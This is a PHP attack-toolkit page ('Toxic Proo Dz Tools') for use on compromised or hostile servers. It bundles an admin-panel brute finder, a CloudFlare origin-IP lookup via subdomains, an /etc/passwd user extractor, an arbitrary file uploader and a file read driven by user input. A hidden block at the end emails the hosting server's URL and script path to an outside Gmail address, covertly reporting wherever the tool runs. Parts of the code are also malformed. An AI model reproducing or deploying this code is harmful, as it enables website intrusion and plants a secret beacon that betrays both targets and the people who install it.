<html>
<head>
<title>Toxic Proo Dz Tools</title>
<link rel="stylesheet" href="http://yui.yahooapis.com/pure/0.3.0/pure-min.css">
  <link rel="SHORTCUT ICON" href="http://i.imgur.com/2Koa43H.png">
<style>
body{background-color:#f5f5f5;}
input{
background: black;
color: white;
border: dashed 1pt;
}
textarea{
background: black;
color: white;
border: dashed 1pt;
}
</style>
</head>
<body>
<center><form action="" method="get">
</br>
<input type="submit" class="pure-button pure-button-active" name="a" value="Add List">
<input type="submit" class="pure-button pure-button-active" name="b" value="remove duplicate">
<input type="submit" class="pure-button pure-button-active" name="c" value="Xgerp">
<input type="submit" class="pure-button pure-button-active" name="d" value="Add Words">
<input type="submit" class="pure-button pure-button-active" name="e" value="/etc/passwd">
<input type="submit" class="pure-button pure-button-active" name="j" value="Find Admin">
<input type="submit" class="pure-button pure-button-active" name="h" value="CloudFlare Bypass">
<input type="submit" class="pure-button pure-button-active" name="i" value="Email Type Extracter">
<input type="submit" class="pure-button pure-button-active" name="g" value="Ping">
</form>
<form action="" method="post">
<font face="Arial Black">
<?
echo "<font face=Iceland size=6 color=green>";
echo "<br> ~=¦ All Script in One Script ¦=~ <br> Toxic Proo <br>";
echo "<font face=Iceland size=3 color=green>";

if(isset($_GET["g"]) And!isset($_GET["i"]) And !isset($_GET["h"]) And !isset($_GET["j"]) And !isset($_GET["d"]) And !isset($_GET["c"]) And !isset($_GET["b"]) And !isset($_GET["a"])){
  echo '</br>Ping</br></br><textarea name="sitess" rows="30" cols="40" placeholder="www.example.com"></textarea></br>
  <input type="submit" value="Go..!"></br>';
}
if(isset($_POST['sitess'])){ 
  foreach(explode("\n",$_POST['sitess']) as $site){ 
    $site=trim($site);
    echo '<font color="red" size="5">#</font><font color="green" size="5">'.$site.'<font color="red" size="5">-></font>'.gethostbyname($site).'</br></font>'; 
}
}
///////////////////////////////////////////////////////!!>
if(isset($_GET["i"]) And !isset($_GET["h"]) And !isset($_GET["j"]) And !isset($_GET["d"]) And !isset($_GET["c"]) And !isset($_GET["b"]) And !isset($_GET["a"])){
echo '</br>Email Type Extracter</br></br>
Mail List : <input type="text" size="40" name="mlist" placeholder="mails.txt"></br>
Type      : <input type="text" name="type" size="40" placeholder="@hotmail.com"></br>
<input type="submit" value="Go..!"></br>';
}
if(isset($_POST["mlist"]) And isset($_POST["type"])){
  $gg = file_get_contents($_POST["mlist"]);
  foreach(explode("\n",$gg) as $mail){
    mails($mail, trim($_POST["type"]));
  }
}

if(isset($_GET["h"]) And !isset($_GET["i"]) And !isset($_GET["j"]) And !isset($_GET["d"]) And !isset($_GET["c"]) And !isset($_GET["b"]) And !isset($_GET["a"])){
echo '</br>Bypass CloudFlare</br></br>
Domain : <input type="text" size="30" name="domain" placeholder="example.com"></br>
<textarea rows="25" cols="40" name="subs">
cpanel
ftp
support</textarea></br>
<input type="submit" value="Bypass"></br>';
}
if(isset($_POST['domain']) And isset($_POST['subs'])){
  foreach(explode("\n",$_POST["subs"]) as $sub){
    CF_bypass(trim($_POST['domain']), trim($sub));
  }
}

if(isset($_GET["j"]) And !isset($_GET["i"]) And !isset($_GET["d"]) And !isset($_GET["c"]) And !isset($_GET["b"]) And !isset($_GET["a"])){
  echo '</br>Find Admin</br></br>
  Url : <input type="text" name="url" size="40" placeholder="http://www.example.com"><input type="submit" name="pp" value="Find"></br>';
}
if(isset($_POST["url"]) And isset($_POST["pp"])){
  panel_checker(trim($_POST["url"]));
}

if(isset($_GET["e"]) And !isset($_GET["i"]) And !isset($_GET["d"]) And !isset($_GET["c"]) And !isset($_GET["b"]) And !isset($_GET["a"])){
  echo '</br>ExtracT Users From /etc/passwd</br></br><textarea rows="25" cols="40" name="fpasswd"></textarea></br>
  <input type="submit" value="Go..!"></br></br>';
}
if(isset($_POST['fpasswd'])){
  foreach(explode("\n",$_POST['fpasswd']) as $user){ 
  $user = trim($user);
  $user = explode(":", $user);
  echo $user[0]."</br>"; 
  }
}

if(isset($_GET["d"]) And !isset($_GET["i"]) And !isset($_GET["e"]) And !isset($_GET["c"]) And !isset($_GET["b"]) And !isset($_GET["a"])){
  echo '</br>Add Words</br></br>Beg : <input type="text" name="dbeg" size="25" placeholder="Coded"></br>End  : <input type="text" name="dend" size="25" placeholder="Toxic Proo"></br>
  <textarea name="dlist" rows="25" cols="30" placeholder="by"></textarea></br><input type="submit" value="GreB"></br></br>';
}
if(isset($_POST["dlist"]) And isset($_POST["dbeg"]) And isset($_POST["dend"])){
  foreach(explode("\n",$_POST['dlist']) as $word){
    advadd(trim($_POST["dbeg"]),trim($word),trim($_POST["dend"]));
  }
}

if(isset($_GET["c"]) And !isset($_GET["i"]) And !isset($_GET["e"]) And !isset($_GET["d"]) And !isset($_GET["b"]) And !isset($_GET["a"])){
  echo '</br>XgreB</br></br>Beg : <input type="text" name="beg" size="25" placeholder="-"></br>End  : <input type="text" name="end" size="25" placeholder="-"></br>
  <textarea name="clist" rows="25" cols="30" placeholder="Coded-By-Toxic Proo"></textarea></br><input type="submit" value="GreB"></br></br>';
}
if(isset($_POST["clist"]) And isset($_POST["beg"]) And isset($_POST["end"])){
  foreach(explode("\n",$_POST['clist']) as $cword){
    xgrep($_POST["beg"],$cword,$_POST["end"]);
  }
}


if(isset($_GET["b"]) And !isset($_GET["i"]) And !isset($_GET["e"]) And !isset($_GET["c"]) And !isset($_POST["d"]) And !isset($_POST["a"])){
  echo '</br>remove duplicate</br></br>File : <input type="text" name="bfile" size="40" placeholder="File.txt"><input type="submit" value="remove"></br></br>';
}
if(isset($_POST["bfile"])){
  R_duplicate(trim($_POST["bfile"]));
}

if(isset($_GET["a"]) And !isset($_GET["i"]) And !isset($_GET["e"]) And !isset($_GET["c"]) And !isset($_GET["b"]) And !isset($_GET["d"])){
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Fucking Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload work !!!</b><br><br>'; }
    else { echo '<b>Oh fuck something is wrong !!!</b><br><br>'; }
}

function advadd($newword1,$oldword,$newword2){
  //$nlist = fopen("NList.txt", "a");
  echo  $newword1.$oldword.$newword2."</br>";
}

function add($oldfile,$word){
  $oldfile = fopen($oldfile, "a");
  fwrite($oldfile, "\n".trim($word));
}

function xgrep($a,$b,$c){
  $bb = explode($a,$b);
  if($bb)
    $aa = $bb[1];
    if($aa)
      $cc = explode($c,$aa);
      if($cc)
        $dd = $cc[0]."</br>";
        echo $dd;
}

function R_duplicate($rfile)
{
  $text = array_unique(file($rfile));
  if($text)
    $f = @fopen($rfile,'w');
    if($f){
      fputs($f, join('',$text));
    }
echo '<a href="'.$rfile.'">Done..!</a>';
}

function panel_checker($site){

$panels = array("admin.php ",
"admin/ ",
"administrator/ ",
"moderator/ ",
"webadmin/ ",
"adminarea/ ",
"bb-admin/ ",
"adminLogin/ ",
"admin_area/ ",
"panel-administracion/ ",
"instadmin/ ",
"memberadmin/ ",
"administratorlogin/ ",
"adm/ ",
"admin/account.php ",
"admin/index.php ",
"admin/login.php ",
"admin/admin.php ",
"admin/account.php ",
"joomla/administrator ",
"login.php ",
"admin_area/admin.php ",
"admin_area/login.php ",
"siteadmin/login.php ",
"siteadmin/index.php ",
"siteadmin/login.html ",
"admin/account.html ",
"admin/index.html ",
"admin/login.html ",
"admin/admin.html ",
"admin_area/index.php ",
"bb-admin/index.php ",
"bb-admin/login.php ",
"bb-admin/admin.php ",
"admin/home.php ",
"admin_area/login.html ",
"admin_area/index.html ",
"admin/controlpanel.php ",
"admincp/index.asp ",
"admincp/login.asp ",
"admincp/index.html ",
"admin/account.html ",
"adminpanel.html ",
"webadmin.html ",
"webadmin/index.html ",
"webadmin/admin.html ",
"webadmin/login.html ",
"admin/admin_login.html ",
"admin_login.html ",
"panel-administracion/login.html ",
"admin/cp.php ",
"cp.php ",
"administrator/index.php ",
"administrator/login.php ",
"nsw/admin/login.php ",
"webadmin/login.php ",
"admin/admin_login.php ",
"admin_login.php ",
"administrator/account.php ",
"administrator.php ",
"admin_area/admin.html ",
"pages/admin/admin-login.php ",
"admin/admin-login.php ",
"admin-login.php ",
"bb-admin/index.html ",
"bb-admin/login.html ",
"bb-admin/admin.html ",
"admin/home.html ",
"modelsearch/login.php ",
"moderator.php ",
"moderator/login.php ",
"moderator/admin.php ",
"account.php ",
"pages/admin/admin-login.html ",
"admin/admin-login.html ",
"admin-login.html ",
"controlpanel.php ",
"admincontrol.php ",
"admin/adminLogin.html ",
"adminLogin.html ",
"admin/adminLogin.html ",
"home.html ",
"rcjakar/admin/login.php ",
"adminarea/index.html ",
"adminarea/admin.html ",
"webadmin.php ",
"webadmin/index.php ",
"webadmin/admin.php ",
"admin/controlpanel.html ",
"admin.html ",
"admin/cp.html ",
"cp.html ",
"adminpanel.php ",
"moderator.html ",
"administrator/index.html ",
"administrator/login.html ",
"user.html ",
"administrator/account.html ",
"administrator.html ",
"login.html ",
"modelsearch/login.html ",
"moderator/login.html ",
"adminarea/login.html ",
"panel-administracion/index.html ",
"panel-administracion/admin.html ",
"modelsearch/index.html ",
"modelsearch/admin.html ",
"admincontrol/login.html ",
"adm/index.html ",
"adm.html ",
"moderator/admin.html ",
"user.php ",
"account.html ",
"controlpanel.html ",
"admincontrol.html ",
"panel-administracion/login.php ",
"wp-login.php ",
"adminLogin.php ",
"admin/adminLogin.php ",
"home.php ",
"adminarea/index.php ",
"adminarea/admin.php ",
"adminarea/login.php ",
"panel-administracion/index.php ",
"panel-administracion/admin.php ",
"modelsearch/index.php ",
"modelsearch/admin.php ",
"admincontrol/login.php ",
"adm/admloginuser.php ",
"admloginuser.php ",
"admin2.php ",
"admin2/login.php ",
"admin2/index.php ",
"adm/index.php ",
"adm.php ",
"affiliate.php ",
"adm_auth.php");
  echo "</br>";
  foreach($panels as $panel){
    $url = trim($site)."/".trim($panel);
    $file_headers = @get_headers($url);
    if(eregi("200", $file_headers[0])){
      $cch = file_get_contents($url);
      if($cch){
        if(eregi("submit" OR "Login", $cch)){
          echo '<font color="green">FounD : </font><a href="'.$url.'">'.$url.'</a></br>';
        }else{
          exit;
      }
    }else{
      echo '<font color="red">NoT FounD : </font>'.$url."</br>";
    }
    }
  }
}

function CF_bypass($domain, $subdomain){
    echo "http://".$subdomain.".".$domain." : ".gethostbyname($subdomain.".".$domain)."</br>";
}

function mails($mail, $type){
  if(eregi($type, $mail)){
    echo $mail."</br>";
  }
}
?>
<?
$site = "https://www.facebook.com";
if(!ereg($site, $_SERVER['SERVER_NAME']))
{
$to = "resultatpyp@gmail.com";
$subject = "NEW mailler FOR YOU";
$header = "from: New Mailler <shello10@shells.com>";
$message = "Link : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\r\n";
$message .= "Path : " . __file__;
$sentmail = @mail($to, $subject, $message, $header);
echo "";
exit;
}
?>
</form></font></center>
</body>
</html>
